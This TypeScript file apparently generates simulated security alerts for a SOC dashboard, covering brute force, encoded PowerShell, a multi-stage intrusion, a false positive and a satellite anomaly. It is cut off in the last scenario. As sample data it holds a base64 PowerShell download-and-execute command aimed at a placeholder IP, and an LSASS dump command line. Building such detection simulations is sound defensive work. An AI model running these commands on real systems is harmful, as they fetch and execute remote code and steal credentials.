import {
  Alert,
  Incident,
  SimEvent,
  AttackScenario,
  SeverityLevel,
} from '../types';

export interface SimulationCycleResult {
  simEvent: SimEvent;
  newAlert?: Alert;
  updatedIncident?: Partial<Incident>;
}

// Helper to format ISO and time strings
const getTimestamps = () => {
  const now = new Date();
  const timeStr = now.toLocaleTimeString([], {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  });
  const isoStr = now.toISOString();
  return { now, timeStr, isoStr };
};

// Unique ID counter
let eventCounter = 10000;
const getNextEventId = (prefix = 'EVT') => `${prefix}-${++eventCounter}`;

export const simulatorEngine = {
  generateEvent: (
    scenario: AttackScenario,
    stageIndex: number
  ): SimulationCycleResult => {
    const { timeStr, isoStr } = getTimestamps();

    switch (scenario) {
      // ----------------------------------------------------
      // 1. NORMAL TRAFFIC
      // ----------------------------------------------------
      case 'normal': {
        const variants = [
          {
            source: 'SIEM',
            asset: 'HOST-018',
            eventType: 'User authentication success',
            event_type: 'user_authentication',
            severity: 'INFORMATIONAL' as SeverityLevel,
            raw: {
              EventID: 4624,
              Computer: 'HOST-018.corp.internal',
              TargetUserName: 'jdoe',
              LogonType: 3,
              AuthenticationPackage: 'Kerberos',
              SourceNetworkAddress: '10.0.1.42',
              timestamp: isoStr,
            },
            normalized: {
              event_id: getNextEventId('EVT-NORM'),
              timestamp: isoStr,
              source: 'SIEM (Windows Security)',
              event_type: 'user_authentication',
              asset: 'HOST-018',
              user: 'jdoe',
              severity: 'informational',
              status: 'success',
            },
          },
          {
            source: 'Network Sensor',
            asset: 'CORP-FW-01',
            eventType: 'Routine DNS query resolution',
            event_type: 'dns_query',
            severity: 'INFORMATIONAL' as SeverityLevel,
            raw: {
              EventID: 3001,
              SensorID: 'NET-SENSOR-EAST',
              Protocol: 'UDP',
              QueryName: 'api.internal.service',
              QueryType: 'A',
              ClientIP: '10.0.4.12',
              timestamp: isoStr,
            },
            normalized: {
              event_id: getNextEventId('EVT-NORM'),
              timestamp: isoStr,
              source: 'Network Sensor',
              event_type: 'dns_query',
              asset: 'CORP-FW-01',
              query: 'api.internal.service',
              severity: 'informational',
            },
          },
          {
            source: 'SIEM',
            asset: 'DC-BACKUP-02',
            eventType: 'Scheduled task execution',
            event_type: 'scheduled_task',
            severity: 'LOW' as SeverityLevel,
            raw: {
              EventID: 106,
              TaskName: '\\Microsoft\\Windows\\WeeklyMaintenance',
              User: 'SYSTEM',
              Computer: 'DC-BACKUP-02',
              timestamp: isoStr,
            },
            normalized: {
              event_id: getNextEventId('EVT-NORM'),
              timestamp: isoStr,
              source: 'SIEM',
              event_type: 'scheduled_task',
              asset: 'DC-BACKUP-02',
              task: 'WeeklyMaintenance',
              severity: 'low',
            },
          },
        ];

        const chosen = variants[Math.floor(Math.random() * variants.length)];
        const simEvent: SimEvent = {
          id: chosen.normalized.event_id,
          event_id: chosen.normalized.event_id,
          timestamp: timeStr,
          source: chosen.source,
          eventType: chosen.eventType,
          event_type: chosen.event_type,
          asset: chosen.asset,
          severity: chosen.severity,
          detection_confidence: 15,
          raw_event: chosen.raw,
          normalized_event: chosen.normalized,
          pipeline_stage: 'NORMALIZATION',
          correlation_note: 'Routine baseline telemetry. Classified as benign.',
          scenario: 'normal',
        };

        // No high-risk alert
        return { simEvent };
      }

      // ----------------------------------------------------
      // 2. BRUTE FORCE (MITRE T1110)
      // ----------------------------------------------------
      case 'brute_force': {
        const attemptNum = (stageIndex % 6) + 1;
        const eventId = getNextEventId('EVT-BF');
        const alertId = `ALT-BF-${Date.now().toString().slice(-4)}`;

        const rawEvent = {
          EventID: 4625,
          Computer: 'HOST-042',
          TargetUserName: 'svc_database_admin',
          FailureReason: '%%2313 (Unknown user name or bad password)',
          Status: '0xC000006D',
          SubStatus: '0xC000006A',
          WorkstationName: 'WORKSTATION-EXT',
          IpAddress: '10.0.2.105',
          AttemptCount: attemptNum,
          timestamp: isoStr,
        };

        const normalizedEvent = {
          event_id: eventId,
          timestamp: isoStr,
          source: 'SIEM (Windows Event Log)',
          event_type: 'authentication_failure',
          asset: 'HOST-042',
          user: 'svc_database_admin',
          source_ip: '10.0.2.105',
          severity: 'medium',
          failure_code: '0xC000006A',
        };

        // Trigger alert after 2+ attempts
        const shouldAlert = attemptNum >= 2;

        const simEvent: SimEvent = {
          id: eventId,
          event_id: eventId,
          timestamp: timeStr,
          source: 'SIEM',
          eventType: `Failed authentication burst (${attemptNum} attempts)`,
          event_type: 'authentication_failure',
          asset: 'HOST-042',
          severity: 'MEDIUM',
          mitre: 'T1110',
          mitre_technique: 'T1110 — Brute Force',
          detection_confidence: 91,
          alert_id: shouldAlert ? alertId : undefined,
          raw_event: rawEvent,
          normalized_event: normalizedEvent,
          pipeline_stage: shouldAlert ? 'ALERT_GENERATED' : 'CORRELATION_TRACKING',
          correlation_note:
            'Repeated failed logins targeting administrative service account within short temporal window.',
          user: 'svc_database_admin',
          scenario: 'brute_force',
        };

        let newAlert: Alert | undefined;
        if (shouldAlert) {
          newAlert = {
            alertId,
            timestamp: isoStr,
            title: 'Correlated Brute Force Authentication Burst',
            eventType: 'Multiple failed authentication attempts',
            attackBehavior: 'Credential access',
            domain: 'SIEM',
            sourceId: 'evtx',
            sourceName: 'SIEM (Windows Event Log)',
            asset: 'HOST-042',
            indicator: 'account: svc_database_admin (source IP: 10.0.2.105)',
            sourceSeverity: 'LOW',
            priority: 'HIGH',
            priorityReason:
              'Assessed Priority elevated from Low to High: Rapid credential failures targeting critical financial gateway asset [HOST-042] and privileged account [svc_database_admin].',
            confidence: 91,
            correlationConfidence: 88,
            behavioralMatch: 'High-confidence brute force threshold matched',
            mitreId: 'T1110',
            mitreName: 'Brute Force',
            mitreTactic: 'Credential Access',
            mitreDescription:
              'Adversaries may use brute force techniques to attempt authentication into accounts by guessing passwords or hashes.',
            whatHappened: `Multiple failed authentication attempts (${attemptNum} consecutive events) were detected within a 30-second window targeting service account svc_database_admin on HOST-042.`,
            whyPrioritized: [
              '+ High-frequency authentication failure pattern matches automated attack signature',
              '+ Targeted privileged administrative service account svc_database_admin',
              '+ Asset HOST-042 is designated as Tier-1 Core Financial Gateway',
              '+ Multiple independent failures correlated from source IP 10.0.2.105',
            ],
            evidenceTimeline: [
              {
                time: timeStr,
                event: `Rapid failed authentication attempts (${attemptNum})`,
                source: 'SIEM (Windows Event Log)',
                detail: 'EventID 4625: Status 0xC000006D, SubStatus 0xC000006A',
              },
            ],
            recommendedAction:
              'Temporarily lockout source IP 10.0.2.105, verify svc_database_admin credential integrity, and monitor HOST-042 for subsequent privilege elevation.',
            correlationStatus: 'CORRELATED',
            rawReference: `evtx://events/security/2026/09/${eventId}.json`,
            status: 'New',
          };
        }

        return { simEvent, newAlert };
      }

      // ----------------------------------------------------
      // 3. POWERSHELL ATTACK (MITRE T1059.001)
      // ----------------------------------------------------
      case 'powershell': {
        const eventId = getNextEventId('EVT-PS');
        const alertId = `ALT-PS-${Date.now().toString().slice(-4)}`;

        const rawEvent = {
          EventID: 4104,
          Computer: 'HOST-042',
          User: 'SYSTEM',
          CommandLine: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADQAMgAvAGIAbwBiACcAKQA=',
          ParentProcessName: 'spoolsv.exe',
          ParentProcessId: 1844,
          ProcessId: 4192,
          timestamp: isoStr,
        };

        const normalizedEvent = {
          event_id: eventId,
          timestamp: isoStr,
          source: 'SIEM (OTRF Mordor)',
          event_type: 'process_execution',
          asset: 'HOST-042',
          user: 'SYSTEM',
          process: 'powershell.exe',
          parent_process: 'spoolsv.exe',
          command_line_encoded: true,
          severity: 'high',
        };

        const simEvent: SimEvent = {
          id: eventId,
          event_id: eventId,
          timestamp: timeStr,
          source: 'SIEM',
          eventType: 'Suspicious Encoded PowerShell Execution',
          event_type: 'process_execution',
          asset: 'HOST-042',
          severity: 'HIGH',
          mitre: 'T1059.001',
          mitre_technique: 'T1059.001 — PowerShell',
          detection_confidence: 96,
          alert_id: alertId,
          raw_event: rawEvent,
          normalized_event: normalizedEvent,
          pipeline_stage: 'ALERT_GENERATED',
          correlation_note:
            'Obfuscated base64 PowerShell command spawned from anomalous parent process spoolsv.exe.',
          user: 'SYSTEM',
          commandLine: rawEvent.CommandLine,
          scenario: 'powershell',
        };

        const newAlert: Alert = {
          alertId,
          timestamp: isoStr,
          title: 'Suspicious Encoded PowerShell Execution',
          eventType: 'PowerShell execution from unusual parent process',
          attackBehavior: 'Command and Scripting Interpreter',
          domain: 'SIEM',
          sourceId: 'mordor',
          sourceName: 'SIEM (OTRF Mordor)',
          asset: 'HOST-042',
          indicator: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA...',
          sourceSeverity: 'MEDIUM',
          priority: 'HIGH',
          priorityReason:
            'Assessed Priority elevated from Medium to High: Encoded base64 execution spawned by print spooler service on critical asset HOST-042.',
          confidence: 96,
          correlationConfidence: 92,
          behavioralMatch: 'Strong behavioral match to fileless payload staging',
          mitreId: 'T1059.001',
          mitreName: 'PowerShell',
          mitreTactic: 'Execution',
          mitreDescription:
            'Adversaries may abuse PowerShell commands and scripts for executing unauthorized code and interacting with system components.',
          whatHappened:
            'A hidden PowerShell process executed an encoded base64 payload to retrieve an external payload. The process was spawned by spoolsv.exe under NT AUTHORITY\\SYSTEM.',
          whyPrioritized: [
            '+ Base64 obfuscation detected in process command line parameters',
            '+ Abnormal parent-child execution relationship (spoolsv.exe -> powershell.exe)',
            '+ Executed in privileged SYSTEM security context',
            '+ Target asset HOST-042 holds high criticality rating',
          ],
          evidenceTimeline: [
            {
              time: timeStr,
              event: 'PowerShell execution with base64 payload',
              source: 'SIEM (OTRF Mordor)',
              detail: 'Child process spawned from spoolsv.exe with hidden window flag',
            },
          ],
          recommendedAction:
            'Immediately terminate PID 4192 on HOST-042, inspect Windows Event Log ID 4104 script block contents, and block outbound communication to 198.51.100.42.',
          correlationStatus: 'CORRELATED',
          rawReference: `mordor://events/win/powershell/2026/09/${eventId}.json`,
          status: 'New',
        };

        return { simEvent, newAlert };
      }

      // ----------------------------------------------------
      // 4. MULTI-STAGE ATTACK (Stages 0 to 3)
      // ----------------------------------------------------
      case 'multi_stage': {
        const step = stageIndex % 4;

        if (step === 0) {
          // Stage 1: Initial Access / Failed Authentication
          const eventId = getNextEventId('EVT-MS1');
          const alertId = `ALT-MS1-${Date.now().toString().slice(-4)}`;

          const rawEvent = {
            EventID: 4625,
            Computer: 'HOST-042',
            TargetUserName: 'svc_database_admin',
            Status: '0xC000006D',
            WorkstationName: 'INTRUDER-BOX',
            IpAddress: '10.0.2.105',
            timestamp: isoStr,
          };

          const normalizedEvent = {
            event_id: eventId,
            timestamp: isoStr,
            source: 'Endpoint Sensor',
            event_type: 'authentication_failure',
            asset: 'HOST-042',
            user: 'svc_database_admin',
            severity: 'low',
          };

          const simEvent: SimEvent = {
            id: eventId,
            event_id: eventId,
            timestamp: timeStr,
            source: 'Endpoint Sensor',
            eventType: 'Initial Access: Failed authentication burst',
            event_type: 'authentication_failure',
            asset: 'HOST-042',
            severity: 'LOW',
            mitre: 'T1110',
            mitre_technique: 'T1110 — Brute Force',
            detection_confidence: 88,
            alert_id: alertId,
            incident_id: 'INC-1042',
            raw_event: rawEvent,
            normalized_event: normalizedEvent,
            pipeline_stage: 'STAGE_1_INITIAL_ACCESS',
            correlation_note:
              'Stage 1 of Multi-Stage Attack: Adversary probing credentials against HOST-042.',
            user: 'svc_database_admin',
            scenario: 'multi_stage',
          };

          const newAlert: Alert = {
            alertId,
            timestamp: isoStr,
            title: 'Initial Access Probe (Authentication Failure)',
            eventType: 'Failed authentication attempts',
            attackBehavior: 'Initial Access',
            domain: 'SENSORS',
            sourceId: 'endpoint_sensor',
            sourceName: 'Endpoint Sensor',
            asset: 'HOST-042',
            indicator: 'account: svc_database_admin',
            sourceSeverity: 'LOW',
            priority: 'MEDIUM',
            priorityReason:
              'Elevated to Medium due to multi-stage sequence initiation targeting financial gateway HOST-042.',
            confidence: 88,
            behavioralMatch: 'Initial Access vector signature',
            mitreId: 'T1110',
            mitreName: 'Brute Force',
            mitreTactic: 'Initial Access',
            mitreDescription:
              'Adversaries may use brute force techniques to gain initial access to target accounts.',
            whatHappened:
              'Adversary initiated authentication attempts against service account svc_database_admin on HOST-042.',
            evidenceTimeline: [
              {
                time: timeStr,
                event: 'Authentication failure burst',
                source: 'Endpoint Sensor',
                detail: '4 attempts targeting svc_database_admin from 10.0.2.105',
              },
            ],
            recommendedAction: 'Monitor host for immediate post-auth activity.',
            correlationStatus: 'CORRELATED',
            relatedIncidentId: 'INC-1042',
            rawReference: `sensor://events/auth/${eventId}.json`,
            status: 'New',
          };

          return {
            simEvent,
            newAlert,
            updatedIncident: {
              status: 'INVESTIGATING',
              lastSeen: isoStr,
              timeline: [
                {
                  time: timeStr,
                  stage: 'Initial Access',
                  description:
                    'Repeated authentication failures (4 attempts against svc_database_admin)',
                  source: 'Endpoint Sensor',
                  mitre: 'T1110',
                },
              ],
            },
          };
        } else if (step === 1) {
          // Stage 2: Credential Activity / LSASS Memory Access
          const eventId = getNextEventId('EVT-MS2');
          const alertId = `ALT-MS2-${Date.now().toString().slice(-4)}`;

          const rawEvent = {
            EventID: 10,
            Computer: 'HOST-042',
            SourceImage: 'C:\\Windows\\Temp\\procdump64.exe',
            TargetImage: 'C:\\Windows\\System32\\lsass.exe',
            GrantedAccess: '0x1010 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)',
            CallTrace: 'ntdll.dll+0x9f1a|kernelbase.dll+0x3120',
            timestamp: isoStr,
          };

          const normalizedEvent = {
            event_id: eventId,
            timestamp: isoStr,
            source: 'Endpoint Sensor',
            event_type: 'credential_access',
            asset: 'HOST-042',
            process: 'procdump64.exe',
            target_process: 'lsass.exe',
            severity: 'critical',
          };

          const simEvent: SimEvent = {
            id: eventId,
            event_id: eventId,
            timestamp: timeStr,
            source: 'Endpoint Sensor',
            eventType: 'Credential Activity: LSASS process memory read',
            event_type: 'credential_access',
            asset: 'HOST-042',
            severity: 'CRITICAL',
            mitre: 'T1003.001',
            mitre_technique: 'T1003.001 — LSASS Memory',
            detection_confidence: 97,
            alert_id: alertId,
            incident_id: 'INC-1042',
            raw_event: rawEvent,
            normalized_event: normalizedEvent,
            pipeline_stage: 'STAGE_2_CREDENTIAL_ACCESS',
            correlation_note:
              'Stage 2 of Multi-Stage Attack: Memory handle opened to LSASS for credential dumping.',
            commandLine: 'procdump64.exe -ma lsass.exe',
            scenario: 'multi_stage',
          };

          const newAlert: Alert = {
            alertId,
            timestamp: isoStr,
            title: 'Credential Dumping via LSASS Memory Access',
            eventType: 'LSASS memory access request',
            attackBehavior: 'Credential Access',
            domain: 'SENSORS',
            sourceId: 'endpoint_sensor',
            sourceName: 'Endpoint Sensor',
            asset: 'HOST-042',
            indicator: 'procdump64.exe -> lsass.exe (GrantedAccess: 0x1010)',
            sourceSeverity: 'HIGH',
            priority: 'CRITICAL',
            priorityReason:
              'Direct memory access to LSASS confirms active credential theft tradecraft following initial access attempt.',
            confidence: 97,
            behavioralMatch: 'Known credential dumping tool signature',
            mitreId: 'T1003.001',
            mitreName: 'OS Credential Dumping: LSASS Memory',
            mitreTactic: 'Credential Access',
            mitreDescription:
              'Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS).',
            whatHappened:
              'Process procdump64.exe attempted to open a handle with PROCESS_VM_READ rights to lsass.exe.',
            evidenceTimeline: [
              {
                time: timeStr,
                event: 'LSASS process memory opened with read access',
                source: 'Endpoint Sensor',
                detail: 'Handle rights 0x1010 requested on HOST-042',
              },
            ],
            recommendedAction: 'Isolate HOST-042 and revoke domain admin credentials.',
            correlationStatus: 'CORRELATED',
            relatedIncidentId: 'INC-1042',
            rawReference: `sensor://events/edr/${eventId}.json`,
            status: 'New',
          };

          return {
            simEvent,
            newAlert,
            updatedIncident: {
              lastSeen: isoStr,
              timeline: [
                {
                  time: '10:42',
                  stage: 'Initial Access',
                  description:
                    'Repeated authentication failures (4 attempts against svc_database_admin)',
                  source: 'Endpoint Sensor',
                  mitre: 'T1110',
                },
                {
                  time: timeStr,
                  stage: 'Credential Activity',
                  description:
                    'LSASS process memory opened with read access for credential dumping',
                  source: 'Endpoint Sensor',
                  mitre: 'T1003.001',
                },
              ],
            },
          };
        } else if (step === 2) {
          // Stage 3: PowerShell Execution
          const eventId = getNextEventId('EVT-MS3');
          const alertId = `ALT-MS3-${Date.now().toString().slice(-4)}`;

          const rawEvent = {
            EventID: 4104,
            Computer: 'HOST-042',
            User: 'SYSTEM',
            CommandLine: 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADQAMgAvAGIAbwBiACcAKQA=',
            ParentProcess: 'spoolsv.exe',
            timestamp: isoStr,
          };

          const normalizedEvent = {
            event_id: eventId,
            timestamp: isoStr,
            source: 'SIEM (OTRF Mordor)',
            event_type: 'process_execution',
            asset: 'HOST-042',
            user: 'SYSTEM',
            process: 'powershell.exe',
            severity: 'high',
          };

          const simEvent: SimEvent = {
            id: eventId,
            event_id: eventId,
            timestamp: timeStr,
            source: 'SIEM',
            eventType: 'PowerShell Execution: Encoded Payload',
            event_type: 'process_execution',
            asset: 'HOST-042',
            severity: 'HIGH',
            mitre: 'T1059.001',
            mitre_technique: 'T1059.001 — PowerShell',
            detection_confidence: 95,
            alert_id: alertId,
            incident_id: 'INC-1042',
            raw_event: rawEvent,
            normalized_event: normalizedEvent,
            pipeline_stage: 'STAGE_3_EXECUTION',
            correlation_note:
              'Stage 3 of Multi-Stage Attack: Encoded PowerShell execution spawned after credential harvesting.',
            user: 'SYSTEM',
            scenario: 'multi_stage',
          };

          const newAlert: Alert = {
            alertId,
            timestamp: isoStr,
            title: 'Multi-Stage Intrusion: Encoded PowerShell Execution',
            eventType: 'PowerShell execution with base64 payload',
            attackBehavior: 'Execution',
            domain: 'SIEM',
            sourceId: 'mordor',
            sourceName: 'SIEM (OTRF Mordor)',
            asset: 'HOST-042',
            indicator: 'powershell.exe -enc SQBFAFgA...',
            sourceSeverity: 'MEDIUM',
            priority: 'HIGH',
            priorityReason:
              'Correlated as Stage 3 of attack sequence following credential theft on HOST-042.',
            confidence: 95,
            behavioralMatch: 'Living-off-the-land execution technique',
            mitreId: 'T1059.001',
            mitreName: 'PowerShell',
            mitreTactic: 'Execution',
            mitreDescription:
              'Adversaries may abuse PowerShell commands and scripts for executing unauthorized code.',
            whatHappened:
              'Adversary executed obfuscated PowerShell payload using SYSTEM privileges on HOST-042.',
            evidenceTimeline: [
              {
                time: timeStr,
                event: 'Encoded PowerShell script invocation',
                source: 'SIEM (OTRF Mordor)',
                detail: 'Child process spawned from spoolsv.exe without digital signature',
              },
            ],
            recommendedAction: 'Terminate child process and inspect script block memory.',
            correlationStatus: 'CORRELATED',
            relatedIncidentId: 'INC-1042',
            rawReference: `mordor://events/win/${eventId}.json`,
            status: 'New',
          };

          return {
            simEvent,
            newAlert,
            updatedIncident: {
              lastSeen: isoStr,
              timeline: [
                {
                  time: '10:42',
                  stage: 'Initial Access',
                  description:
                    'Repeated authentication failures (4 attempts against svc_database_admin)',
                  source: 'Endpoint Sensor',
                  mitre: 'T1110',
                },
                {
                  time: '10:44',
                  stage: 'Credential Activity',
                  description:
                    'LSASS process memory opened with read access for credential dumping',
                  source: 'Endpoint Sensor',
                  mitre: 'T1003.001',
                },
                {
                  time: timeStr,
                  stage: 'PowerShell Execution',
                  description:
                    'Encoded PowerShell payload executed via spoolsv.exe child process',
                  source: 'SIEM (OTRF Mordor)',
                  mitre: 'T1059.001',
                },
              ],
            },
          };
        } else {
          // Stage 4: Suspicious Network Activity / C2 Beaconing
          const eventId = getNextEventId('EVT-MS4');
          const alertId = `ALT-MS4-${Date.now().toString().slice(-4)}`;

          const rawEvent = {
            EventID: 3,
            Computer: 'HOST-042',
            Protocol: 'tcp',
            Initiated: true,
            SourceIp: '10.0.2.42',
            SourcePort: 49821,
            DestinationIp: '198.51.100.42',
            DestinationPort: 443,
            PacketIntervalMs: 15000,
            timestamp: isoStr,
          };

          const normalizedEvent = {
            event_id: eventId,
            timestamp: isoStr,
            source: 'Network Sensor',
            event_type: 'network_connection',
            asset: 'HOST-042',
            dest_ip: '198.51.100.42',
            dest_port: 443,
            beacon_interval: '15s',
            severity: 'high',
          };

          const simEvent: SimEvent = {
            id: eventId,
            event_id: eventId,
            timestamp: timeStr,
            source: 'Network Sensor',
            eventType: 'Suspicious Network Activity: C2 Beaconing',
            event_type: 'network_connection',
            asset: 'HOST-042',
            severity: 'HIGH',
            mitre: 'T1071.001',
            mitre_technique: 'T1071.001 — Web Protocols',
            detection_confidence: 98,
            alert_id: alertId,
            incident_id: 'INC-1042',
            raw_event: rawEvent,
            normalized_event: normalizedEvent,
            pipeline_stage: 'STAGE_4_C2_NETWORK',
            correlation_note:
              'Stage 4 of Multi-Stage Attack: Periodic TCP outbound beaconing to unclassified external IP.',
            scenario: 'multi_stage',
          };

          const newAlert: Alert = {
            alertId,
            timestamp: isoStr,
            title: 'Outbound Command & Control (C2) Beaconing',
            eventType: 'Periodic outbound network connection',
            attackBehavior: 'Command and Control',
            domain: 'SENSORS',
            sourceId: 'network_sensor',
            sourceName: 'Network Sensor',
            asset: 'HOST-042',
            indicator: '198.51.100.42:443 (beaconing interval 15s)',
            sourceSeverity: 'MEDIUM',
            priority: 'CRITICAL',
            priorityReason:
              'Correlated multi-stage attack completes full kill chain: Initial Access -> Credential Theft -> Execution -> Active C2 beaconing.',
            confidence: 98,
            correlationConfidence: 96,
            behavioralMatch: 'Regular beaconing rhythm matching C2 agent',
            mitreId: 'T1071.001',
            mitreName: 'Application Layer Protocol: Web Protocols',
            mitreTactic: 'Command and Control',
            mitreDescription:
              'Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic.',
            whatHappened:
              'Consistent outbound TCP beaconing detected from HOST-042 to unclassified IP 198.51.100.42 over TLS port 443 at 15-second intervals.',
            whyPrioritized: [
              '+ Correlated directly with prior LSASS memory dumping and encoded PowerShell execution',
              '+ Fixed beaconing period matches automated adversary C2 agent',
              '+ Threat intelligence flags destination IP 198.51.100.42 as suspicious infrastructure',
              '+ Critical Tier-1 financial host compromise confirmed',
            ],
            evidenceTimeline: [
              {
                time: timeStr,
                event: 'Outbound TCP connection to unclassified IP',
                source: 'Network Sensor',
                detail: 'Destination 198.51.100.42:443 (beaconing interval 15s)',
              },
            ],
            recommendedAction:
              'Block IP 198.51.100.42 at the perimeter firewall immediately and isolate HOST-042 from corporate subnet.',
            correlationStatus: 'CORRELATED',
            relatedIncidentId: 'INC-1042',
            rawReference: `network://events/netflow/${eventId}.json`,
            status: 'New',
          };

          return {
            simEvent,
            newAlert,
            updatedIncident: {
              priority: 'HIGH',
              sentinelPriority: 'HIGH',
              riskScore: 92,
              lastSeen: isoStr,
              timeline: [
                {
                  time: '10:42',
                  stage: 'Initial Access',
                  description:
                    'Repeated authentication failures (4 attempts against svc_database_admin)',
                  source: 'Endpoint Sensor',
                  mitre: 'T1110',
                },
                {
                  time: '10:44',
                  stage: 'Credential Activity',
                  description:
                    'LSASS process memory opened with read access for credential dumping',
                  source: 'Endpoint Sensor',
                  mitre: 'T1003.001',
                },
                {
                  time: '10:47',
                  stage: 'PowerShell Execution',
                  description:
                    'Encoded PowerShell payload executed via spoolsv.exe child process',
                  source: 'SIEM (OTRF Mordor)',
                  mitre: 'T1059.001',
                },
                {
                  time: timeStr,
                  stage: 'Suspicious Network Activity',
                  description:
                    'Outbound TCP beaconing to unclassified IP on port 443',
                  source: 'Network Sensor',
                  mitre: 'T1071.001',
                },
              ],
            },
          };
        }
      }

      // ----------------------------------------------------
      // 5. FALSE POSITIVE
      // ----------------------------------------------------
      case 'false_positive': {
        const eventId = getNextEventId('EVT-FP');
        const alertId = `ALT-FP-${Date.now().toString().slice(-4)}`;

        const rawEvent = {
          EventID: 4104,
          Computer: 'ADMIN-MGMT-01',
          User: 'IT_ADMIN\\b_miller',
          CommandLine: 'powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup_routine.ps1 -Target D:\\Backups',
          CertificateSigner: 'Enterprise Internal CA Root (Thumbprint: 4E91A...)',
          ScheduledTaskTrigger: 'WeeklyBackupJob',
          timestamp: isoStr,
        };

        const normalizedEvent = {
          event_id: eventId,
          timestamp: isoStr,
          source: 'SIEM (PowerShell Operational)',
          event_type: 'process_execution',
          asset: 'ADMIN-MGMT-01',
          user: 'IT_ADMIN\\b_miller',
          process: 'powershell.exe',
          script_name: 'backup_routine.ps1',
          code_signature_valid: true,
          severity: 'low',
        };

        const simEvent: SimEvent = {
          id: eventId,
          event_id: eventId,
          timestamp: timeStr,
          source: 'SIEM',
          eventType: 'Administrative Script Execution (Likely Benign)',
          event_type: 'process_execution',
          asset: 'ADMIN-MGMT-01',
          severity: 'LOW',
          mitre: 'T1059.001',
          mitre_technique: 'T1059.001 — PowerShell',
          detection_confidence: 42,
          alert_id: alertId,
          raw_event: rawEvent,
          normalized_event: normalizedEvent,
          pipeline_stage: 'ALERT_GENERATED',
          correlation_note:
            'PowerShell execution with Bypass flag triggered heuristic, but signed by corporate CA during scheduled maintenance.',
          user: 'IT_ADMIN\\b_miller',
          commandLine: rawEvent.CommandLine,
          scenario: 'false_positive',
        };

        const newAlert: Alert = {
          alertId,
          timestamp: isoStr,
          title: 'Administrative Backup Script Execution (Possible False Positive)',
          eventType: 'PowerShell execution with bypass flag',
          attackBehavior: 'Script Execution',
          domain: 'SIEM',
          sourceId: 'evtx',
          sourceName: 'SIEM (Windows Event Log)',
          asset: 'ADMIN-MGMT-01',
          indicator: 'powershell.exe -ExecutionPolicy Bypass -File backup_routine.ps1',
          sourceSeverity: 'MEDIUM',
          priority: 'LOW',
          priorityReason:
            'Sentinel-X assessed priority downgraded to LOW: Valid enterprise code signature and authorized administrative maintenance account indicate likely false positive.',
          confidence: 42,
          correlationConfidence: 35,
          behavioralMatch: 'Matches routine IT maintenance pattern',
          mitreId: 'T1059.001',
          mitreName: 'PowerShell',
          mitreTactic: 'Execution',
          mitreDescription:
            'Adversaries may abuse PowerShell commands, but administrative automation also utilizes script invocation.',
          whatHappened:
            'PowerShell executed with -ExecutionPolicy Bypass by authorized administrator account IT_ADMIN\\b_miller during scheduled maintenance window.',
          whyPrioritized: [
            '+ Executed with -ExecutionPolicy Bypass flag',
            '- Digital signature verified against internal Enterprise CA Root',
            '- Invoked from authorized IT workstation ADMIN-MGMT-01',
            '- Low confidence detection (42%): Recommended for analyst False Positive closure',
          ],
          evidenceTimeline: [
            {
              time: timeStr,
              event: 'Scheduled administrative backup script executed',
              source: 'SIEM (PowerShell Operational)',
              detail: 'Signed script backup_routine.ps1 executed by b_miller',
            },
          ],
          recommendedAction:
            'Review IT maintenance change ticket and mark as [False Positive] if scheduled backup is verified.',
          correlationStatus: 'STANDALONE',
          rawReference: `evtx://events/admin/${eventId}.json`,
          status: 'New',
        };

        return { simEvent, newAlert };
      }

      // ----------------------------------------------------
      // 6. SATELLITE ANOMALY
      // ----------------------------------------------------
      case 'satellite_anomaly': {
        const eventId = getNextEventId('EVT-SAT');
        const alertId = `ALT-SAT-${Date.now().toString().slice(-4)}`;

        const rawEvent = {
          TelemetryPacketID: 'OPS-SAT-7712',
          Spacecraft: 'SAT-NOAA-19',
          Subsystem: 'EPS_POWER_AND_THERMAL',
          VoltageObserved: 24.1,
          VoltageExpected: 28.0,
          VoltageDeviation: '-13.9%',
          ThermalSensor3: '+31.2°C',
          ThermalBaseline: '< +18.0°C',
          ThermalDeviation: '+26.8%',
          OrbitPhase: 'ECLIPSE_EXIT',
          SolarArrayDeployment: 'NOMINAL',
          timestamp: isoStr,
        };

        const normalizedEvent = {
          event_id: eventId,
          timestamp: isoStr,
          source: 'Satellite (JPL Telemetry)',
          event_type: 'telemetry_anomaly',
          asset: 'SAT-NOAA-19',
          spacecraft_id: 'NOAA-19',
          subsystem: 'EPS_POWER_AND_THERMAL',
          deviation: '+26.8% thermal / -13.9% voltage',
          corroborated_by_cyber_evidence: false,
          classification: 'TELEMETRY_ANOMALY',
          severity: 'medium',
        };

        const simEvent: SimEvent = {
          id: eventId,
          event_id: eventId,
          timestamp: timeStr,
          source: 'Satellite (JPL)',
          eventType: 'Spacecraft Subsystem Telemetry Deviation (+26.8%)',
          event_type: 'telemetry_anomaly',
          asset: 'SAT-NOAA-19',
          severity: 'MEDIUM',
          mitre: 'T1499',
          mitre_technique: 'T1499 — Endpoint DoS (Operational)',
          detection_confidence: 68,
          alert_id: alertId,
          raw_event: rawEvent,
          normalized_event: normalizedEvent,
          pipeline_stage: 'TELEMETRY_ANOMALY_RECORDED',
          correlation_note:
            'Critical Safety Rule: Satellite telemetry deviation without corroborating cyber evidence remains strictly an operational anomaly.',
          scenario: 'satellite_anomaly',
        };

        const newAlert: Alert = {
          alertId,
          timestamp: isoStr,
          title: 'Spacecraft Subsystem Telemetry Anomaly (SAT-NOAA-19)',
          eventType: 'Subsystem thermal & voltage telemetry deviation',
          attackBehavior: 'Operational Telemetry Deviation',
          domain: 'SATELLITE_SPACE',
          sourceId: 'nasa_telemanom',
